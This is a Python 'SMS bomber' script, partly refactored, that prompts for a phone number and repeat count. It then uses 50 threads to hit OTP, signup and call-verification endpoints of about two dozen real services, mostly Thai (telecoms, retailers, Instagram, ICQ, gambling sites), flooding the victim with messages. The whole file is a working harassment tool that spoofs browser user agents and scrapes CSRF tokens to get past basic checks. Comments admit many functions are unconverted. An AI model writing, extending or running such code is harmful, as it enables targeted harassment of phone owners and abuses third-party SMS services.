import re
from secrets import token_hex
import requests
import os
from os import system  # Explicitly import system
from time import sleep
# from requests import Session # requests.Session is used directly
from colorama import Fore, init as colorama_init
from concurrent.futures import ThreadPoolExecutor

# Initialize Colorama
colorama_init(autoreset=True)


def green(text):
    if os.name == 'nt':  # Enable color for Windows CMD
        system("")
    faded = ""
    blue_val = 100
    for character in text:
        blue_val += 2
        if blue_val > 255:
            blue_val = 255
        faded += (f"\033[38;2;0;255;{blue_val}m{character}\033[0m")
    return faded


# ----------------------------------------------- #

banner = """
   ███████╗███╗   ███╗███████╗    ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
   ██╔════╝████╗ ████║██╔════╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
   ███████╗██╔████╔██║███████╗    ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
   ╚════██║██║╚██╔╝██║╚════██║    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
   ███████║██║ ╚═╝ ██║███████║    ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝

                BY | Arsyny1x 
"""

# Global session object will be created inside CNP for each run, or can be truly global
# For simplicity with AOC loop, let's make it truly global and reset if needed.
# However, defining API functions inside CNP that use a CNP-scoped session is also good.
# Let's try with a truly global session first for simplicity of this refactor.
http_session = requests.Session()
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
http_session.headers.update({"user-agent": DEFAULT_USER_AGENT})

# This will hold the phone number for the current CNP execution
current_phone_number = ""


def CNP():
    global current_phone_number
    global http_session  # Access the global session

    # Reset session headers for each CNP run if AOC causes looping with different settings
    # or ensure session is managed cleanly if CNP is called multiple times.
    # For this script, a single session instance should be fine.
    http_session.headers.update({"user-agent": DEFAULT_USER_AGENT})

    os.system("title SMS SENDER BY DIAMOND#9999")
    print(green(banner))

    phone_input = input("[+] Enter Phone : ")
    current_phone_number = phone_input  # Set for API functions to use

    count = 0
    while True:
        try:
            count_input = input("[+] Enter Count : ")
            count = int(count_input)
            if count > 0:
                break
            else:
                print(f"{Fore.YELLOW}Count must be a positive number.{Fore.RESET}")
        except ValueError:
            print(f"{Fore.YELLOW}Invalid input. Please enter a number for count.{Fore.RESET}")

    print()
    sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    sleep(1.5)

    # Specific user-agent strings from original code, if different from DEFAULT_USER_AGENT
    # This one is slightly different (Edg/95.0.1020.40)
    specific_useragent_v2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
    # This one is for mobile
    mobile_user_agent = "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"

    # --- Define ALL API functions INSIDE CNP ---
    # This allows them to "see" current_phone_number and other CNP-scoped variables like specific user agents.

    def trueh():
        func_name = "trueh"
        try:
            http_session.post(
                f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={current_phone_number}")
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def aisplay():
        func_name = "aisplay"
        # aisplay uses a specific mobile user-agent and complex auth
        temp_session = requests.Session()  # Using a temporary session for this complex one
        try:
            ReqTOKEN = temp_session.get(
                "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
                headers={"User-Agent": mobile_user_agent}).text
            token_val_match = re.search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN)
            if not token_val_match:
                print(f"{Fore.RED}Error in {func_name}: Could not find token in AIS Play page.{Fore.RESET}")
                return
            token_val = token_val_match.group(1)
            temp_session.post("https://srfng.ais.co.th/login/sendOneTimePW",
                              data=f"msisdn=66{current_phone_number[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
                              headers={"User-Agent": mobile_user_agent,
                                       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                       "authorization": f'Bearer {token_val}'})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")
        finally:
            temp_session.close()

    def cnp1():  # Uses specific_useragent_v2 implicitly from original `useragent` variable if not overridden by default
        func_name = "cnp1"
        try:
            # The original code's `useragent` variable was specific_useragent_v2
            http_session.post("https://api.myfave.com/api/fave/v3/auth",
                              headers={"client_id": "dd7a668f74f1479aad9a653412248b62",
                                       "User-Agent": specific_useragent_v2},
                              json={"phone": f"{current_phone_number}"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp3():  # Uses specific_useragent_v2 implicitly
        func_name = "cnp3"
        try:
            http_session.post("https://api2.1112.com/api/v1/otp/create",
                              headers={"User-Agent": specific_useragent_v2},  # from original `useragent`
                              data={'phonenumber': current_phone_number, 'language': "th"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp5():  # Uses specific_useragent_v2 implicitly
        func_name = "cnp5"
        try:
            http_session.post("https://api.1112delivery.com/api/v1/otp/create",
                              headers={"User-Agent": specific_useragent_v2},  # from original `useragent`
                              data={'phonenumber': current_phone_number, 'language': "th"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp7():  # Uses specific_useragent_v2 implicitly
        func_name = "cnp7"
        try:
            http_session.post("https://shop.foodland.co.th/login/generation",
                              headers={"User-Agent": specific_useragent_v2},  # from original `useragent`
                              data={"phone": current_phone_number})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp9():  # Uses default user-agent (original `header` variable)
        func_name = "cnp9"
        try:
            # Original `header` variable matches DEFAULT_USER_AGENT, so no specific header needed unless other keys were in `header`
            http_session.post('https://api.sacasino9x.com/api/RegisterService/RequestOTP',
                              json={"Phone": current_phone_number})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp10():  # Uses specific_useragent_v2 implicitly
        func_name = "cnp10"
        try:
            http_session.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp",
                              headers={"User-Agent": specific_useragent_v2},  # from original `useragent`
                              data={"phone": current_phone_number})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    # ... (MORE FUNCTIONS NEED TO BE CONVERTED HERE)
    # I will continue with a few more complex ones or ones using different header variables.

    def cnp13():  # Uses specific_useragent_v2 and specific Content-Type
        func_name = "cnp13"
        try:
            http_session.post("https://api.scg-id.com/api/otp/send_otp",
                              headers={"User-Agent": specific_useragent_v2,
                                       "Content-Type": "application/json;charset=UTF-8"},
                              json={"phone_no": current_phone_number})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp16():  # Uses specific_useragent_v2 implicitly
        func_name = "cnp16"
        try:
            http_session.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
                              headers={"User-Agent": specific_useragent_v2},  # from original `useragent`
                              json={"on": {"value": current_phone_number, "country": "66"}, "type": "mobile"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def cnp28():  # Uses a specific user-agent that matches DEFAULT_USER_AGENT (Edg/95.0.1020.38)
        func_name = "cnp28"
        try:
            # The user-agent in the original was "Mozilla/5.0 ... Edg/95.0.1020.38" which is our DEFAULT_USER_AGENT
            http_session.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
                              json={"username": f"0{current_phone_number}", "password": "6302814184624az",
                                    "name": "0903281894", "provinceCode": "28", "districtCode": "393",
                                    "subdistrictCode": "3494", "zipcode": "40260", "siebelCustomerTypeId": "710",
                                    "acceptTermAndCondition": "true", "hasSeenConsent": "false", "locale": "th_TH"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def x1():  # Uses default user-agent (original `header` variable)
        func_name = "x1"
        try:
            # Original `header` matches DEFAULT_USER_AGENT
            http_session.post('https://api2.1112.com/api/v1/otp/create',
                              json={"phonenumber": current_phone_number, "language": "th"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def api1():  # Uses specific mobile_user_agent and content-type
        func_name = "api1"
        try:
            http_session.post("https://m.thisshop.com/cos/send/code/notice",
                              json={"sessionContext": {"channel": "h5", "entityCode": 0,
                                                       "userReferenceNumber": "12w12y11r52gz259ue14rr7g7370239m",
                                                       "localDateTimeText": "20220115182850", "ricnpMessage": "{}",
                                                       "serviceCode": "FLEX0001", "superUserId": "sysadmin",
                                                       "tokenKey": "149d5c7bae10304c8aba0da2bbc59cb7",
                                                       "authorizationReason": "", "transactionBranch": "TFT_ORG_0000",
                                                       "userId": "", "locale": "th-TH"}, "noticeType": 1,
                                    "businessType": "RT0001", "phoneNumber": f"66-{current_phone_number}"},
                              headers={"content-type": "application/json; charset=UTF-8",
                                       "user-agent": mobile_user_agent})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def api2():  # Uses specific mobile_user_agent, content-type, referer, cookie
        func_name = "api2"
        custom_headers = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": mobile_user_agent,
            "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
            "cookie": "_gcl_au=1.1.1123274548.1637746846"  # Note: Static cookie might expire or be invalid
        }
        try:
            http_session.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",
                              headers=custom_headers,
                              data=f"phoneno={current_phone_number}&retrycount=0")
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def ig_token():  # Uses default user-agent (original `headers` variable)
        # Original `headers` matches DEFAULT_USER_AGENT
        try:
            response = http_session.get("https://www.instagram.com/")  # Removed headers argument
            d = response.headers['set-cookie']
            csrf_match = re.search("csrftoken=(.*?);", d)
            ig_did_match = re.search("ig_did=(.*?);", d)
            if csrf_match and ig_did_match:
                return csrf_match.group(1), ig_did_match.group(1)
            else:
                # Fallback or error if specific cookies are not found as expected.
                # Search for csrftoken and then the next part which might be ig_did
                csrf_token_val = ""
                ig_did_val = ""
                parts = d.split(";")
                for i, part in enumerate(parts):
                    if "csrftoken=" in part:
                        csrf_token_val = part.split("=")[1]
                    if "ig_did=" in part:  # More robust search for ig_did
                        ig_did_val = part.split("=")[1]

                if csrf_token_val and ig_did_val:
                    return csrf_token_val, ig_did_val

                print(f"{Fore.YELLOW}Warning: Could not parse tokens reliably from Instagram headers.{Fore.RESET}")
                return None, None  # Indicate failure
        except Exception as e:
            print(f"{Fore.RED}Error in ig_token: {e}{Fore.RESET}")
            return None, None

    def newa39():  # Instagram
        func_name = "newa39"
        try:
            token, cid = ig_token()
            if token and cid:
                # The user-agent here is different from default.
                ua_instagram = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
                http_session.post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",
                                  data=f"client_id={cid}&phone_number=66{current_phone_number[1:]}&phone_id=&big_blue_token=",
                                  headers={"Content-Type": "application/x-www-form-urlencoded",
                                           "X-Requested-With": "XMLHttpRequest",
                                           "User-Agent": ua_instagram,
                                           "X-CSRFToken": token})
                print(
                    f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}Skipping {func_name} due to missing Instagram tokens.{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def icq():  # Uses specific user-agent
        func_name = "icq_new"
        ua_icq = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
        try:
            http_session.post(f"https://u.icq.net/api/v86/rapi/auth/sendCode",
                              headers={"user-agent": ua_icq},
                              json={"reqId": "85174-1664860517",
                                    "params": {"phone": f"66{current_phone_number[1:]}", "language": "en-US",
                                               "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def firster():  # Uses specific user-agent (same as icq's)
        func_name = "firster"
        ua_firster = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
        try:
            http_session.post(f"https://graph.firster.com/graphql",
                              headers={"user-agent": ua_firster},
                              json={"operationName": "sendOtp", "variables": {
                                  "input": {"mobileNumber": current_phone_number[1:], "phoneCode": "THA-66"}},
                                    "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def fillgoods():  # Uses specific user-agent (same as icq's)
        func_name = "fillgoods"
        ua_fillgoods = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
        try:
            http_session.post(f"https://fgproduction.api-fillgoods.com/user/send-otp",
                              headers={"user-agent": ua_fillgoods},
                              json={"phone_number": current_phone_number, "email": f"{token_hex(8)}1@gmail.com"})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def big666():  # Uses specific user-agent (same as icq's)
        func_name = "big666"
        ua_big666 = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
        try:
            http_session.post("https://big666.com/api/register-otp",
                              headers={"user-agent": ua_big666},
                              json={"brands_id": "62626d6dd8db2d0012eaa37f", "tel": current_phone_number,
                                    "token": 'null'})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def sfbet88():  # Uses specific user-agent (same as icq's)
        func_name = "sfbet88"
        ua_sfbet88 = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
        try:
            http_session.post("https://www.sfbet88.com/service/mobile/check",
                              headers={"user-agent": ua_sfbet88},
                              json={
                                  "phoneNumber": current_phone_number})  # Original used "0824790959", changed to current_phone_number
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def gettgo():  # Uses specific user-agent (same as icq's)
        func_name = "gettgo"
        ua_gettgo = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
        try:
            http_session.post("https://gettgo.com/sessions/otp_for_sign_in",
                              headers={"user-agent": ua_gettgo},
                              data={"mobile_number": current_phone_number})
            print(
                f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    def apicall():  # Uses default user-agent
        func_name = "apicall"
        try:
            # Default user-agent from http_session is used
            http_session.post("https://www.theconcert.com/rest/request-otp",
                              data={'mobile': f"{current_phone_number}", 'country_code': "TH", 'lang': "th",
                                    'channel': "call", 'digit': '4'})
            print(
                f"{Fore.BLUE}Sender Call ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")

    # !!! ATTENTION: YOU NEED TO CONVERT ALL OTHER API FUNCTIONS SIMILARLY !!!
    # This includes all cnpX, xX, apiX (api1 to api101), newaX functions.
    # Ensure you correctly identify if they used `header`, `headers`, or `useragent` variables from original code
    # and pass the correct User-Agent string if it's different from DEFAULT_USER_AGENT.
    # Also, handle any other specific headers (Content-Type, Authorization, etc.)

    # Create a list of all API functions you have defined and converted
    all_api_functions_to_call = [
        trueh, aisplay, cnp1, cnp3, cnp5, cnp7, cnp9, cnp10, cnp13, cnp16, cnp28, x1,
        api1, api2,  # ... up to api101 (ensure all are converted and added)
        newa39,  # ... all newa functions (ensure all are converted and added)
        icq, firster, fillgoods, big666, sfbet88, gettgo, apicall
        # Add ALL your ~130+ functions here after converting them
    ]

    # Placeholder for functions that still need conversion by the user
    # For the script to run, you must convert and list them above.
    # Example: If you had cnp11, it would look like:
    # def cnp11():
    #     func_name = "cnp11"
    #     try:
    #         # Check original headers for cnp11, useragent variable was specific_useragent_v2
    #         http_session.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
    #                           headers={"User-Agent": specific_useragent_v2},
    #                           data={"phone": current_phone_number})
    #         print(f"{Fore.BLUE}Sender SMS ({func_name}){Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {current_phone_number[:5]}*****{Fore.RESET}")
    #     except Exception as e:
    #         print(f"{Fore.RED}Error in {func_name}: {e}{Fore.RESET}")
    # And then add cnp11 to all_api_functions_to_call list.

    if not all_api_functions_to_call:
        print(
            f"{Fore.YELLOW}Warning: No API functions are listed for execution. Please complete the script.{Fore.RESET}")
        return

    # --- ThreadPoolExecutor Setup ---
    MAX_WORKERS = 50  # Adjust as needed

    print(
        f"\n{Fore.YELLOW}Starting SMS sending process for {current_phone_number} with {count} iterations...{Fore.RESET}")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix='SMSBomber') as executor:
        for i in range(count):
            print(f"{Fore.CYAN}Submitting batch {i + 1}/{count} of API calls to thread pool.{Fore.RESET}")
            for api_func in all_api_functions_to_call:
                executor.submit(api_func)  # api_func already handles its print and try-except

            if count > 1 and i < count - 1:  # Avoid sleep on the very last iteration's submission
                sleep(0.1)  # Delay between submitting batches, if desired

    print(f"\n{Fore.GREEN}All {count} batches submitted. Threads will complete their work.{Fore.RESET}")
    print(f"{Fore.GREEN}Check console for individual SMS sent messages or errors.{Fore.RESET}")
    # The 'with ThreadPoolExecutor' block ensures all submitted tasks are waited for completion
    # before the 'with' block is exited, effectively 'joining' the threads.

    sleep(5)  # Give some time for final messages to print before AOC loop restarts (if it does)


class AOC:
    @staticmethod
    def start():
        while True:  # Keep the bomber running, asking for new number/count each time
            CNP()
            again = input(f"{Fore.YELLOW}Do you want to run another bombing session? (y/n): {Fore.RESET}").lower()
            if again != 'y':
                print(f"{Fore.MAGENTA}Exiting SMS Bomber. Goodbye!{Fore.RESET}")
                break
            os.system('cls' if os.name == 'nt' else 'clear')  # Clear screen for next session


if __name__ == "__main__":
    try:
        AOC.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Process interrupted by user. Exiting...{Fore.RESET}")
    finally:
        http_session.close()  # Ensure the global session is closed when the program exits

        print(f"{Fore.CYAN}HTTP session closed.{Fore.RESET}")
